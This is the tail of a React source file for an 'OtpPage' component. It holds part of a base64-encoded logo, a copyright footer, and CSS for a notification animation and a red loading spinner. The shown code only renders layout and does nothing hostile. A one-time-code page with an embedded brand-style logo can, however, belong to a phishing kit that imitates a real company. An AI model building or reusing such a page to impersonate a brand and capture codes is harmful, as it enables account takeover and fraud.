Y1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+" 
                      style={{ color: 'transparent', width: '128px', height: 'auto' }}
                    />
                  </td>
                </tr>
              </tbody>
              <tfoot>
                <tr className="footer-copyright-row">
                  <td colSpan="2" className="footer-copyright">
                    2026 {t('copyright')}
                  </td>
                </tr>
              </tfoot>
            </table>
          </div>
        </div>
      </main>
      
      {/* Styles for notification animation */}
      <style>{`
        @keyframes fadeInDown {
          from {
            opacity: 0;
            transform: translateX(-50%) translateY(-15px);
          }
          to {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
          }
        }
        .loading-spinner {
          border: 3px solid #f3f3f3;
          border-top: 3px solid #d40511;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default OtpPage;